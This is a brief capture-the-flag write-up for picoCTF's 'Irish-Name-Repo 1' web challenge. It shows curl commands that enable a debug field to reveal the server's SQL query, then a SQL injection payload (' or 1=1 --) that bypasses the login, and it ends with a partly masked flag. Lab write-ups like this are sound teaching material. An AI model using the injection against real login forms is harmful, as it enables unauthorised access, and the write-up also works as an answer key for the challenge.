# picoCTF – Irish-Name-Repo 1 

* **Category:** Web
* **Points:** 300

## Challenge

>  Do you think you can log us in? Try to see if you can login!

## Solution

Open web console to inspect the network traffic. Go to Admin Login page and click on the Login button. In the request payload there is a field named `debug` with value `0`. Make same request again using *curl* with `debug=1` payload. 

```
curl "<URL>/login.php" -d "username=password=&debug=1"
```
The response will show the SQL query used by the server. From this we need to infer that the solution is based on SQL injection.


Make another request with username field containing a SQL statement which always evaluates to true.
```
curl "<URL>/login.php" -d "username=test' or 1=1 --&password=&debug=1"
```


```
picoCTF{s0m3_SQL_xxxxxx}
```
